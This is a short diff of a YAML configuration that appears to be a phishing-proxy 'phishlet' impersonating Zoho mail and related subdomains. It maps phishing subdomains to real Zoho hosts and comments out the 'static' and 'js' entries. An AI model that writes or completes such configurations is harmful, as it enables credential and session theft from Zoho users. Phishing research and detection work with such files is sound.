@@ -6,8 +6,8 @@ proxy_hosts:
   - {phish_sub: 'mail', orig_sub: 'mail', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'us4-wms2', orig_sub: 'us4-wms2', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'salesiq', orig_sub: 'salesiq', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
-  - {phish_sub: 'static', orig_sub: 'www', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
-  - {phish_sub: 'js', orig_sub: 'www', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
+  # - {phish_sub: 'static', orig_sub: 'www', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
+  # - {phish_sub: 'js', orig_sub: 'www', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
   # - {phish_sub: 'www', orig_sub: 'www', domain: 'zoho.com', session: false, is_landing: false, auto_filter: false}
 
 
